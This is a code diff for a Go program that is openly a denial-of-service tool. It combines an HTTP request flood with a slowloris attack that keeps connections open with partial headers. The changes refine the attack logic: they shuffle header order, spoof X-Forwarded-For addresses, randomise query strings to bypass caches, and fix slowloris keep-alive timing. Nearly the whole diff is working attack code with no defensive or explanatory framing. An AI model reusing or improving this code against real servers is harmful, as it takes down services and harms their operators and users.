@@ -21,7 +21,7 @@ var (
 	timer         int
 	customHost    string
 	httpMethods   = []string{"GET", "HEAD", "POST"}
-	slowlorisRate = 0.4
+	slowlorisRate = 0.4 // float64 type
 )
 
 func init() {
@@ -112,6 +112,7 @@ func buildRequest(method, path string) []byte {
 		host = ip
 	}
 
+	// Randomize header order and content
 	headers := []string{
 		fmt.Sprintf("Host: %s", host),
 		fmt.Sprintf("User-Agent: %s", randomUserAgent()),
@@ -120,8 +121,7 @@ func buildRequest(method, path string) []byte {
 		"Accept-Encoding: gzip, deflate, br",
 		fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
 		"Connection: keep-alive",
-		"Cache-Control: max-age=0",
-		"Upgrade-Insecure-Requests: 1",
+		"Cache-Control: no-cache",
 	}
 
 	if method == "POST" {
@@ -130,17 +130,16 @@ func buildRequest(method, path string) []byte {
 			"Content-Type: application/x-www-form-urlencoded",
 			fmt.Sprintf("Content-Length: %d", len(data)),
 		)
+		rand.Shuffle(len(headers), func(i, j int) {
+			headers[i], headers[j] = headers[j], headers[i]
+		})
+		return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n%s",
+			method, path, joinHeaders(headers), data))
 	}
 
 	rand.Shuffle(len(headers), func(i, j int) {
 		headers[i], headers[j] = headers[j], headers[i]
 	})
-
-	path += fmt.Sprintf("?cache_bust=%d", rand.Intn(1000000))
-	if rand.Intn(2) == 0 {
-		path += fmt.Sprintf("&rand=%d", rand.Intn(1000000))
-	}
-
 	return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n",
 		method, path, joinHeaders(headers)))
 }
@@ -170,9 +169,13 @@ func floodWorker(id int, stop <-chan struct{}) {
 				continue
 			}
 
-			for i := 0; i < rand.Intn(100)+100; i++ {
+			for i := 0; i < rand.Intn(100)+100; i++ { // 100-200 requests/connection
 				method := httpMethods[rand.Intn(len(httpMethods))]
-				conn.Write(buildRequest(method, path))
+				reqPath := path
+				if rand.Intn(2) == 0 {
+					reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
+				}
+				conn.Write(buildRequest(method, reqPath))
 			}
 			conn.Close()
 		}
@@ -197,12 +200,13 @@ func slowlorisWorker(id int, stop <-chan struct{}) {
 				path, rand.Intn(10000), ip)
 			conn.Write([]byte(partial))
 
+			// Keep connection alive with partial headers
 			for i := 0; i < 10; i++ {
 				select {
 				case <-stop:
 					conn.Close()
 					return
-				case <-time.After(time.Second * time.Duration(rand.Intn(5)+1)):
+				case <-time.After(time.Second * 5):
 					conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(100))))
 				}
 			}
@@ -256,6 +260,7 @@ func main() {
 	stop := make(chan struct{})
 	var wg sync.WaitGroup
 
+	// Start workers
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
 		go func(id int) {
@@ -268,6 +273,7 @@ func main() {
 		}(i)
 	}
 
+	// Run for specified duration
 	time.Sleep(time.Duration(timer) * time.Second)
 	close(stop)
 	wg.Wait()
